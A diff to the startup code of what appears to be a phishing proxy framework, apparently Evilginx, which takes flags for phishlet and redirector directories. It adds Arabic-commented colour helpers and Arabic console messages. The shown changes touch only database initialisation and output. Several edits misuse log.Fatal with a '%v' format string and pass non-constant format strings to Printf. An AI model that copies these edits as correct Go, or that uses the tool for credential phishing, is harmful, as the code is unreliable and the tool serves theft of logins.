@@ -18,6 +18,12 @@ import (
 	"github.com/fatih/color"
 )
 
+// متغيرات الألوان للوحة القيادة
+var lb = color.New(color.FgHiBlue).SprintFunc()   // أزرق
+var lg = color.New(color.FgHiGreen).SprintFunc()  // أخضر
+var lr = color.New(color.FgHiRed).SprintFunc()    // أحمر
+var e = ""
+
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
@@ -152,15 +158,15 @@ func main() {
 		}
 
 		fmt.Printf("\n\n")
-		fmt.Printf(lb + " تهيئة قاعدة بيانات MongoDB... ")
+		fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))
 
 		mongo_db, err := database.NewMongoDatabase(*mongo_uri, db_name)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatal("%v", err)
 		}
 		db = mongo_db
 
-		fmt.Printf(lg + "تم" + e)
+		fmt.Printf(lg("تم") + e)
 	} else {
 		// استخدام BuntDB (التنفيذ الحالي)
 		storage_path := ""
@@ -171,28 +177,28 @@ func main() {
 		} else {
 			ex_path, err := os.Executable()
 			if err != nil {
-				log.Fatal(err)
+				log.Fatal("%v", err)
 			}
 			ex_dir := filepath.Dir(ex_path)
 			storage_path = filepath.Join(ex_dir, "data.db")
 		}
 
 		fmt.Printf("\n\n")
-		fmt.Printf(lb + " تهيئة قاعدة البيانات... " + e)
-		fmt.Printf("%s [%s]", storage_path, core.DbVersion)
+		fmt.Printf(lb(" تهيئة قاعدة البيانات... ") + e)
+		fmt.Printf("%s", storage_path)
 
 		err = os.MkdirAll(filepath.Dir(storage_path), 0711)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatal("%v", err)
 		}
 
 		fdb, err := database.NewDatabase(storage_path)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatal("%v", err)
 		}
 		db = fdb
 
-		fmt.Printf(lg + "تم" + e)
+		fmt.Printf(lg("تم") + e)
 	}
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
